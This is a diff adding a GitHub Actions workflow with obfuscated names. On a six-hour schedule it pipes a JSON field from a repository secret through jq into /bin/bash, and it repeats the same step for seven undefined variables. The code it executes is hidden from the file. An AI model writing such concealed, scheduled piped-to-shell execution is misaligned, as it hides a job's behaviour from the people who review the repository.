@@ -1,0 +1,23 @@
+name: rexinwangyoubenren
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rexinwangyoubenren
+        env:
+          ruag97: ${{ secrets.ruag97 }}
+        run: |
+          echo $ruag97 | jq -r .bnjlz78 | /bin/bash
+          echo $vowu53526 | jq -r .ygjq59 | /bin/bash
+          echo $uyizm45 | jq -r .l6669 | /bin/bash
+          echo $hvs98 | jq -r .xc31358 | /bin/bash
+          echo $i94 | jq -r .zxh72 | /bin/bash
+          echo $hzhq776 | jq -r .tbz5626 | /bin/bash
+          echo $l99 | jq -r .pb47773 | /bin/bash
+          echo $lq8145 | jq -r .lrng7560 | /bin/bash
+
